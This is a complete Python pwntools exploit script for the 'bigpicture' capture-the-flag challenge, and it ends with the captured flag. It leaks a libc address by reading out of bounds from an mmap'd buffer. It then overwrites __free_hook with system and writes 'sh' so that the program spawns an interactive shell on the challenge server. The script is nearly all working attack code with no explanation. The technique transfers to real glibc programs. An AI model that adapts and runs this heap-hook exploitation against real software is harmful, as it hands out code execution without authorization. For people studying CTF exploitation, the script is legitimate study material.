#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

if "remote" in sys.argv:
    r = remote("bigpicture.chal.pwning.xxx", 420)
    libc = ELF("./libc-2.23.so")
    off2libc = -0x4e2010
else:
    r = process("./bigpicture")
    libc = ELF("../../libc.so.6")
    off2libc = -0x4d8010

def read(offset, size):
    o = ""
    for i in range(size):
        r.sendlineafter("> ", "0, %d, 0" % (offset + i))
        o += r.recvline()[-3]
    return o

def write(offset, data):
    for i, c in enumerate(data):
        r.sendlineafter("> ", "0, %d, %c" % (offset + i, c))

r.sendlineafter("How big? ", "1024 x 1024") # trigger mmap

libc_base = u64(read(off2libc + libc.symbols["stderr"], 6) + "\0\0") - libc.symbols["_IO_2_1_stderr_"]
log.info("libc_base = " + hex(libc_base))

write(off2libc + libc.symbols["__free_hook"], p64(libc_base + libc.symbols["system"]))
write(0, "sh")
r.sendlineafter("> ", "quit")
r.recvline()

r.interactive()

# PCTF{draw_me_like_one_of_your_pwn200s}
